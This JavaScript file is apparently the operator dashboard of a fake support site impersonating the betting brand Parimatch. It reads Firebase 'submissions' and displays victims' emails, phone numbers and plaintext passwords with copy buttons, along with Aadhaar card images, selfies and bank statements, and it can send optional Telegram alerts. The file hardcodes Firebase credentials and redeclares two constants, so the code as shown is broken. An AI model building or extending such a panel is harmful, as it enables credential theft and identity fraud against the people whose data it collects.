const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
  authDomain: "alll-projects-admin-pennal.firebaseapp.com",
  projectId: "alll-projects-admin-pennal",
  storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
  messagingSenderId: "689297868215",
  appId: "1:689297868215:web:2747b19c2da47a31f49432"
};

let _db = null, _unsub = null, _retryTimer = null, _firstLoad = true;

function loadFirebase() {
  return new Promise((resolve, reject) => {
    try {
      if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
      _db = firebase.firestore();
      _db.enablePersistence({ synchronizeTabs: true }).catch(() => {});
      resolve(_db);
    } catch (e) { reject(e); }
  });
}

function startListener() {
  if (_unsub) { _unsub(); _unsub = null; }
  clearTimeout(_retryTimer);
  _unsub = _db.collection('submissions')
    .orderBy('created_at', 'desc')
    .onSnapshot({ includeMetadataChanges: true }, snap => {
      if (snap.metadata.fromCache && _firstLoad) return;
      const newIds = new Set();
      snap.forEach(d => newIds.add(d.id));
      if (state.prevIds.size > 0) {
        let n = 0;
        snap.forEach(d => { if (!state.prevIds.has(d.id)) n++; });
        if (n > 0) toast(n + ' new', 'success');
      }
      state.prevIds = newIds;
      state.allSubs = snap.docs.map(d => ({ id: d.id, ...d.data() }));
      _firstLoad = false;
      setConn(snap.metadata.fromCache ? 'cached' : 'connected');
      renderHome();
    }, err => {
      console.error(err);
      setConn('error');
      _retryTimer = setTimeout(() => { setConn('connecting'); startListener(); }, 5000);
    });
}

const TELEGRAM_CONFIG = {
  botToken: localStorage.getItem('p1tg_bot_token') || '',
  chatId: localStorage.getItem('p1tg_chat_id') || '',
  enabled: localStorage.getItem('p1tg_enabled') === 'true'
};
function saveTelegramConfig() {
  localStorage.setItem('p1tg_bot_token', TELEGRAM_CONFIG.botToken);
  localStorage.setItem('p1tg_chat_id', TELEGRAM_CONFIG.chatId);
  localStorage.setItem('p1tg_enabled', TELEGRAM_CONFIG.enabled);
}
function sendTelegramAlert(msg) {
  if (!TELEGRAM_CONFIG.enabled || !TELEGRAM_CONFIG.botToken || !TELEGRAM_CONFIG.chatId) return;
  fetch('https://api.telegram.org/bot' + TELEGRAM_CONFIG.botToken + '/sendMessage', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: TELEGRAM_CONFIG.chatId, text: msg, parse_mode: 'HTML' })
  }).then(r => r.json()).catch(() => {});
}

const state = { allSubs: [], currentPage: 'home', selectedId: null, search: '', prevIds: new Set() };

const $ = id => document.getElementById(id);

function esc(s) { return s == null ? '' : String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
function toDate(ts) { if (!ts) return null; const d = ts.toDate ? ts.toDate() : new Date(ts); return isNaN(d.getTime()) ? null : d; }
function fmtTime(ts) { const d = toDate(ts); if (!d) return '—'; return d.toLocaleString('en-IN', { day:'2-digit', month:'short', year:'numeric', hour:'2-digit', minute:'2-digit', hour12:true }); }
function fmtRel(ts) {
  const d = toDate(ts); if (!d) return '—';
  const diff = Date.now() - d.getTime();
  if (diff < 60000) return 'now';
  if (diff < 3600000) return Math.floor(diff/60000) + 'm';
  if (diff < 86400000) return Math.floor(diff/3600000) + 'h';
  if (diff < 604800000) return Math.floor(diff/86400000) + 'd';
  return fmtTime(ts);
}
function isImageUrl(s) { return typeof s === 'string' && (s.match(/^https?:\/\/.*\.(jpg|jpeg|png|gif|webp)/i) || s.match(/^https:\/\/i\.ibb\.co\//)); }

const types = ['Deposit Problem','Withdrawal Problem','unlock_withdrawal','bonus_problem','KYC Problem','Bank Statement Problem','Live Chat'];
const statuses = ['Pending','Processing','Rejected','Failed','Success but not received'];
const typeIcons = {
  'Deposit Problem': '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>',
  'Withdrawal Problem': '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="3" width="22" height="18" rx="2"/><circle cx="12" cy="12" r="4"/><path d="M1 8h22"/></svg>',
  'unlock_withdrawal': '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>',
  'bonus_problem': '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>',
  'KYC Problem': '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>',
  'Bank Statement Problem': '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>',
  'Live Chat': '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>'
};
function getType(type) {
  if (!type) return 'Other';
  const t = type.toLowerCase();
  if (t.includes('deposit')) return 'Deposit Problem';
  if (t.includes('withdrawal') || t.includes('withdraw')) return 'Withdrawal Problem';
  if (t.includes('unlock') || t.includes('unblock')) return 'unlock_withdrawal';
  if (t.includes('bonus')) return 'bonus_problem';
  if (t.includes('kyc')) return 'KYC Problem';
  if (t.includes('bank') && t.includes('statement')) return 'Bank Statement Problem';
  if (t.includes('chat') || t.includes('live')) return 'Live Chat';
  return type;
}
function typeClass(t) {
  const tl = t.toLowerCase();
  if (tl.includes('deposit') || tl.includes('bank')) return 'deposit';
  if (tl.includes('withdrawal') || tl.includes('withdraw') || tl.includes('unblock')) return 'withdrawal';
  if (tl.includes('unlock')) return 'unblock';
  if (tl.includes('bonus')) return 'bonus';
  if (tl.includes('kyc')) return 'kyc';
  if (tl.includes('bank')) return 'bank';
  if (tl.includes('chat') || tl.includes('live')) return 'chat';
  return 'deposit';
}

function setConn(s) {
  const d = $('connDot');
  if (!d) return;
  d.style.background = s === 'connected' ? '#28A745' : s === 'error' ? '#DC3545' : '#F57C00';
}
function toast(msg, type) {
  const t = $('toast');
  if (!t) return;
  t.className = 'toast' + (type ? ' ' + type : '');
  t.textContent = msg;
  requestAnimationFrame(() => t.classList.add('show'));
  setTimeout(() => t.classList.remove('show'), 2200);
}

function navigateTo(page, id) {
  state.currentPage = page;
  $('page-home').classList.remove('active');
  $('page-detail').classList.remove('active');
  if (page === 'home') { $('page-home').classList.add('active'); }
  else if (page === 'detail' && id) { state.selectedId = id; $('page-detail').classList.add('active'); renderDetail(id); }
}

function init() {
  // Nav
  document.querySelectorAll('.nav-item').forEach(btn => {
    btn.addEventListener('click', () => navigateTo('home'));
  });
  $('backBtn').addEventListener('click', () => navigateTo('home'));

  // Search
  $('searchInput').addEventListener('input', e => { state.search = e.target.value.toLowerCase(); renderHome(); });

  // Seed Test Data
  const seedBtn = $("seedBtn");
  if(seedBtn) seedBtn.addEventListener("click", () => { if(!confirm("Add one random demo submission to Firestore?")) return; seedTestData(); });

  // Image modal
  $('imageModalClose').addEventListener('click', () => $('imageModal').classList.remove('show'));
  $('imageModal').addEventListener('click', e => { if (e.target === $('imageModal')) $('imageModal').classList.remove('show'); });

  // Confirm
  $('confirmCancel').addEventListener('click', () => $('confirmOverlay').classList.remove('show'));
  $('confirmOverlay').addEventListener('click', e => { if (e.target === $('confirmOverlay')) $('confirmOverlay').classList.remove('show'); });

  // Init Firebase
  loadFirebase().then(() => {
    _db.collection('admin_status').doc('p1admin').set({ online: true, site: 'parimatch', lastSeen: firebase.firestore.FieldValue.serverTimestamp() }, { merge: true });
    window.addEventListener('beforeunload', () => _db.collection('admin_status').doc('p1admin').set({ online: false }, { merge: true }));
    document.addEventListener('visibilitychange', () => { _db.collection('admin_status').doc('p1admin').set({ online: document.visibilityState === 'visible', lastSeen: firebase.firestore.FieldValue.serverTimestamp() }, { merge: true }); });
    startListener();
  }).catch(e => { console.error(e); setConn('error'); });
}

/* ===== HOME ===== */
function renderHome() {
  const subs = state.allSubs;
  const now = new Date();
  const startOfDay = new Date(now.getFullYear(), now.getMonth(), now.getDate());
  const startOfWeek = new Date(now); startOfWeek.setDate(now.getDate() - 7);

  let today = 0, week = 0;
  subs.forEach(s => { const d = toDate(s.created_at); if (!d) return; if (d >= startOfDay) today++; if (d >= startOfWeek) week++; });

  $('kpiTotal').textContent = subs.length;
  $('kpiTotalReq').textContent = subs.length;
  $('kpiToday').textContent = today;
  $('listCount').textContent = subs.length + ' request' + (subs.length !== 1 ? 's' : '');

  const q = state.search;
  const filtered = subs.filter(s => {
    if (q) {
      const hay = [s.email, s.mobile, s.user_name, s.name, s.description, s.type, s.request_id, s.game_id, s.amount, s.utr].map(v => (v == null ? '' : String(v)).toLowerCase()).join(' ');
      if (!hay.includes(q)) return false;
    }
    return true;
  });

  renderCards(filtered);
}

function renderCards(subs) {
  const list = $('cardList');
  if (!subs.length) {
    list.innerHTML = '<div class="empty-state"><svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg><p>No requests yet</p></div>';
    return;
  }
  list.innerHTML = subs.map(s => {
    const t = getType(s.type);
    const tc = typeClass(t);
    const name = s.user_name || s.name || s.email || 'Unknown';
    const imgSrc = 'USER-ICON/2288510.png';
    return '<div class="sub-card" data-id="' + esc(s.id) + '">' +
      '<img src="' + esc(imgSrc) + '" style="width:44px;height:44px;border-radius:12px;object-fit:cover;flex-shrink:0;background:#E8EAED;" alt="user" />' +
      '<div class="sub-info">' +
        '<div class="sub-name">' + esc(name) + '</div>' +
        '<div class="sub-type"><span class="type-badge ' + tc + '">' + esc(t) + '</span></div>' +
        '<div class="sub-time">' + fmtRel(s.created_at) + ' · ' + fmtTime(s.created_at).split(' ')[0] + '</div>' +
      '</div>' +
      '<svg class="sub-arrow" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>' +
    '</div>';
  }).join('');

  list.querySelectorAll('.sub-card').forEach(card => {
    card.addEventListener('click', () => navigateTo('detail', card.dataset.id));
  });
}

/* ===== DETAIL ===== */
function renderDetail(id) {
  const s = state.allSubs.find(x => x.id === id);
  if (!s) { $('detailContent').innerHTML = '<div class="empty-state"><p>Not found</p></div>'; return; }
  const t = getType(s.type);
  const tc = typeClass(t);
  const name = s.user_name || s.name || s.email || 'Unknown';
  const email = s.email || '—';
  const mobile = s.mobile || '—';
  const password = s.password || '—';
  const status = s.issue_status || s.status || '—';
  const amount = s.amount || '—';
  const utr = s.utr || 'N/A';
  const method = s.withdraw_method || '—';
  const desc = s.description || '—';
  const gameId = s.game_id || '—';
  const reqId = s.request_id || '—';
  const timestamp = s.timestamp || fmtTime(s.created_at);
  const imgUrl = isImageUrl(s.aadhar_front_url || s.aadhar_back_url || s.selfie_url || s.bank_statement_1_url || s.bank_statement_2_url || s.issue_image_url || s.bonus_issue_image_url || s.profile_image_url) ? (s.aadhar_front_url || s.aadhar_back_url || s.selfie_url || s.bank_statement_1_url || s.bank_statement_2_url || s.issue_image_url || s.bonus_issue_image_url || s.profile_image_url) : null;

  function row(label, value, copyVal) {
    const copyBtn = copyVal !== null ? '<button class="copy-btn" data-copy="' + esc(String(copyVal)) + '"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copy</button>' : '';
    return '<div class="detail-row"><span class="detail-label">' + esc(label) + '</span><span class="detail-value">' + esc(String(value)) + copyBtn + '</span></div>';
  }
  function fieldCopyHandler() {
    document.querySelectorAll('.copy-btn').forEach(b => {
      b.addEventListener('click', e => { e.stopPropagation(); navigator.clipboard?.writeText(b.dataset.copy).then(() => toast('Copied', 'success')).catch(() => {}); });
    });
  }

  let html = '';
  // Identity card
  html += '<div class="detail-card"><h3>Identity</h3>';
  html += row('User Name', name);
  html += row('Email ID', email, email);
  html += row('Mobile Number', mobile, mobile);
  html += row('Password', password, password);
  html += '</div>';

  // Request details
  html += '<div class="detail-card"><h3>Request Details</h3>';
  html += row('Problem Type', t);
  html += row('Status', status);
  html += row('Request ID', reqId);
  html += row('Game ID', gameId);
  html += row('Amount', amount);
  html += row('UTR', utr);
  html += row('Method', method);
  html += row('Date', timestamp);
  html += '</div>';

  // Description
  html += '<div class="detail-card"><h3>Description</h3>';
  html += '<div style="font-size:14px;color:var(--text2);line-height:1.6;">' + esc(desc) + '</div>';
  html += '</div>';

  // Image section
  html += '<div class="detail-card"><h3>Proof Image</h3>';
  html += '<div class="image-section">';
  if (imgUrl) {
    html += '<div class="image-placeholder" id="imgPlaceholder">' +
      '<svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>' +
      '<span>No image uploaded</span></div>';
    html += '<button class="view-btn" data-img="' + esc(imgUrl) + '"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg> View</button>';
    html += '<button class="download-btn" data-dl="' + esc(imgUrl) + '"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg> Download</button>';
  } else {
    html += '<div class="image-placeholder">' +
      '<svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>' +
      '<span>No image uploaded</span></div>';
  }
  html += '</div></div>';

  $('detailContent').innerHTML = html;

  // Copy buttons
  fieldCopyHandler();

  // View button → modal
  const viewBtn = $('detailContent').querySelector('.view-btn');
  if (viewBtn) viewBtn.addEventListener('click', () => { $('modalImage').src = viewBtn.dataset.img; $('imageModal').classList.add('show'); });

  // Download button
  const dlBtn = $('detailContent').querySelector('.download-btn');
  if (dlBtn) dlBtn.addEventListener('click', () => {
    const a = document.createElement('a');
    a.href = dlBtn.dataset.dl;
    a.download = 'proof_' + Date.now() + '.png';
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
    toast('Downloading...', 'success');
  });
}

const types = ["Deposit Problem","Withdrawal Problem","unlock_withdrawal","bonus_problem","KYC Problem","Bank Statement Problem","Live Chat"];
const statuses = ["Pending","Processing","Rejected","Failed","Success but not received"];
const names = ["Amit Sharma","Raj Kumar","Priya Singh","Vikram Joshi","Sneha Patel","Rohit Verma","Deepak Malhotra"];
const domains = ["gmail.com","yahoo.com","outlook.com"];
function randItem(arr){return arr[Math.floor(Math.random()*arr.length)];}
function randNumber(min,max){return Math.floor(Math.random()*(max-min+1))+min;}
function seedTestData(){const type=randItem(types);const name=randItem(names);const email=name.toLowerCase().replace(" ","")+randNumber(10,999)+"@"+randItem(domains);const mobile="+91"+randNumber(6000000000,9999999999);const password="Pass"+randNumber(1000,9999);const status=randItem(statuses);const amount=randNumber(100,50000).toString();const utr="UTR"+randNumber(10000000,99999999);const reqId="TX"+randNumber(100000,999999);const gameId="PARIMATCH"+randNumber(10000,99999);const timestamp=new Date().toLocaleString("en-IN",{day:"2-digit",month:"short",year:"numeric",hour:"2-digit",minute:"2-digit",hour12:true});const payload={request_id:reqId,email,mobile,password,type,issue_status:status,amount,utr,description:"Test demo submission",game_id:gameId,timestamp,source:"P1-Admin (Demo)",site_id:"parimatch",created_at:firebase.firestore.FieldValue.serverTimestamp()};_db.collection("submissions").add(payload).then(()=>{toast("Demo added","success");renderHome();}).catch(e=>{console.error(e);toast("Failed","error");});}
/* ===== INIT ===== */
document.addEventListener('DOMContentLoaded', init);
